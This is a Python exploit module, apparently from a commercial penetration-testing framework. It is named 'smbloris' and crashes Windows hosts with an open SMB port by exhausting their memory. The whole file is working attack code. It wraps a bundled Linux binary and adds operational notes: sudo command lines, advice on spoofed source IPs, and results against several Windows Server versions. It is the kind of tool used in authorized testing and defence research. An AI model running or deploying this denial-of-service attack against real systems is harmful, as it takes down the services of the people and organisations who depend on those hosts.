#!/usr/bin/env python
##ImmunityHeader v1
###############################################################################
## File       :  smbloris.py
## Description:
##            :
## Created_On :  Mon Aug  7 CEST 2017
## Created_By :  X.
##
## (c) Copyright 2015, Immunity, Inc. all rights reserved.
###############################################################################

import sys
import socket
import os
import time
import subprocess
import platform

if '.' not in sys.path:
    sys.path.append('.')

NAME                            = 'Smbloris - Remote kernel crash'
DESCRIPTION                     = 'Triggers a BSOD on Windows hosts with an open (unfiltered) SMB port'
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = 'Microsoft'
DOCUMENTATION['Date public']    = '08/01/17'
DOCUMENTATION['Repeatability']  = ''
DOCUMENTATION["References"]     = "http://www.smbloris.com"
VERSION                         = '1.0'
PROPERTY                        = {}

PROPERTY['TYPE']                = "DoS"
PROPERTY['SITE']                = "Remote"
PROPERTY['ARCH']                = [['Windows']]

CHANGELOG = """
"""

NOTES = """

The exploit exhausts as much memory as possible. It is very effective and will eventually lead to the crash of
the Windows target (BSOD) within mere seconds. Please note that:
    a) Due to the fact that raw sockets are used, a root access is required to run the exploit.
    b) The module is using an underlying Linux binary and therefore cannot be used when Canvas is running on Windows.
    c) ### IMPORTANT ### Running the binary itself might be more efficient than running the exploit module.
    d) If the exploit fails, please run it again with different source IPs or wait a couple of minutes.

Tested against:
    - Windows Server 2016 R2 (amd64) [4096M, 1 CPU]        [no BSOD, RAM exhausted, some apps frozen]
    - Windows Server 2012 R2 (amd64) [2048M, 1 CPU]        [GUI freezes, no BSOD, RAM exhausted]
    - Windows Server 2012 R2 (amd64) [4096M, 2 CPU]        [GUI slows down, some apps killed, RAM exhausted, Windows then recovers]
    - Windows Server 2008 R2 (amd64) [2048M, 4096M, 6144M] [crash almost all the time]
    - Windows 7 Ultimate N (x86)                           [slows down a little the target]

Note:
-----

To execute a command, one must first know the addresses used by the network interfaces:

$ ifconfig
enp0s3    Link encap:Ethernet  HWaddr 08:00:27:zz:xx:yy
          inet addr:192.168.50.39  Bcast:192.168.50.255  Mask:255.255.255.0
[...]
          RX bytes:143743675 (143.7 MB)  TX bytes:171627598 (171.6 M

In this case, '192.168.50.39' is assigned to enp0s3 therefore we can use it in
the -Osrc_ips argument (possibly with other "fake" source IPs)

This is a valid argument:

sudo python exploits/DoS/smbloris/smbloris.py -t 192.168.50.40 -Osrc_ips:192.168.50.39

Another argument could be:

sudo python exploits/DoS/smbloris/smbloris.py -t 192.168.50.40 -Osrc_ips:192.168.50.39,192.168.50.32

where: 192.168.50.32 is a fake address (spoofed)

The underlying binary can also be run from the command line using:
# ./exploits/DoS/smbloris/Resources/smbloris.elf64 -s 192.168.50.39,192.168.50.38,192.168.50.34 -d 192.168.50.56 -p 500 -n 50000

    where:
        -s is the list of source IPs to use (one has to be assigned to an actual interface, in this case 192.168.50.39)
        -d is the target IP
        -p is the initial TCP source port (500 by default)                  [Optional]
        -n is the number of pseudo connections attempted (50000 by default) [Optional]

"""

from exploitutils import *
from tcpexploit import tcpexploit

class theexploit(tcpexploit):

    def __init__(self):
        tcpexploit.__init__(self)
        self.done            = 0
        self.name            = NAME
        # arguments
        self.port            = 445
        self.host            = None
        self.sips            = ''
        self.sport           = 500
        self.nr_cnx          = 60000
        # globals
        self.bin_name        = "smbloris.elf64"
        self.local_path      = os.path.abspath(os.path.join(os.path.dirname(__file__), "Resources/"))
        return

    def getargs(self):
        """
        Get arguments for attack
        """
        self.host    = self.target.interface
        self.sips    = self.argsDict.get("src_ips",self.sips)
        self.sport   = self.argsDict.get("sport",self.sport)
        self.nr_cnx  = self.argsDict.get("nr_cnx",self.nr_cnx)
        return

    def is_os_linux(self):
        if platform.system() == "Linux":
            return True
        else:
            return False

    def is_host_alive(self):
        """
        Quick function to check is the host is alive/reachable.
        """
        try:
            s = socket.socket()
            s.connect((self.host, self.port))
            s.close()
            return True
        except:
            return False

    def get_iface_list(self):
        """
        Returns the list of AF_INET interfaces
        """
        from libs import get_interfaces
        get_interfaces = get_interfaces.GetInterfaces()
        get_interfaces()

        iface_list = []
        for iface in get_interfaces.interfaces:
            for ni_obj in get_interfaces.interfaces.get(iface):
                try:
                    if ni_obj.family_name != "AF_INET":
                        continue
                    iface_list.append([ni_obj.name, ni_obj.addr['address']])
                except:
                    continue
        return iface_list

    def is_valid_ipv4_address(self, address):
        """
        https://stackoverflow.com/questions/319279/how-to-validate-ip-address-in-python
        """
        try:
            socket.inet_pton(socket.AF_INET, address)
        except AttributeError:  # no inet_pton here, sorry
            try:
                socket.inet_aton(address)
            except socket.error:
                return False
            return address.count('.') == 3
        except socket.error:  # not a valid address
            return False

        return True

    def is_src_ips_arg_valid(self):
        """
        Small function to validate a list of coma separated IPs.
        """
        # Is the argument empty?
        if not len(self.sips):
            logging.error("Please provide a source IPs argument (e.g. -Osrc_ips:a.b.c.d)")
            return False

        # Do we have an array of valid IPs?
        ip_list = self.sips.split(',')
        for ip in ip_list:
            if not self.is_valid_ipv4_address(ip):
                logging.error("%s is not a valid source IP" % ip)
                return False

        # Is one the source IP binded to an interface?
        iface_list = self.get_iface_list()
        for ip in ip_list:
            for iface in iface_list:
                if ip == iface[1]:
                    logging.info("%s is assigned to one of the interface, good." % ip)
                    return True

        logging.error("One of the source IPs within the src_ips argument must be assigned to an interface!")
        return False

    def run_binary(self):
        """
        Run the binary using the arguments provided on the CLI.
        """

        try:
            self.binary = os.path.join(self.local_path, self.bin_name)
            args =  [ self.binary ]
            args += [ "-d", "%s" % self.host ]
            args += [ "-s", "%s" % self.sips ]
            args += [ "-n", "%s" % self.nr_cnx ]
            args += [ "-p", "%s" % self.sport ]
            output = subprocess.check_output(args)
            logging.info("\n<BINARY>\n%s</BINARY>" % output)
            return True
        except Exception as e:
            logging.error("The main binary could not run: %s" % str(e))
            return False

    def run(self):

        self.getargs()

        # The binary is for linux only.
        if not self.is_os_linux():
            logging.error("Sorry you can only run this module from Linux!")
            return False

        # First check that the host is alive
        if not self.is_host_alive():
            logging.error("%s:445 is not reachable, aborting." % self.host)
            return False

        # Then check if we are root or equivalent.
        if os.geteuid() != 0:
            logging.error("This module must run under a priviledged user")
            return False

        # Check if we have (a) valid source IP(s)
        if not self.is_src_ips_arg_valid():
            logging.error("A correct source IPs argument is mandatory to run the module!")
            return False

        # If we are root, the sniffer might be running, we need to disable it.
        if self.engine.config["sniffer"] == 'yes':
            self.engine.localsniffer.shutdown()

        ret = self.run_binary()
        if not ret or self.is_host_alive():
            self.setInfo("%s attacking %s:%d - done (failed?)"%(NAME, self.host, self.port))
            return False
        else:
            self.setInfo("%s attacking %s:%d - done (success)"%(NAME, self.host, self.port))
            return True


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(NAME, VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
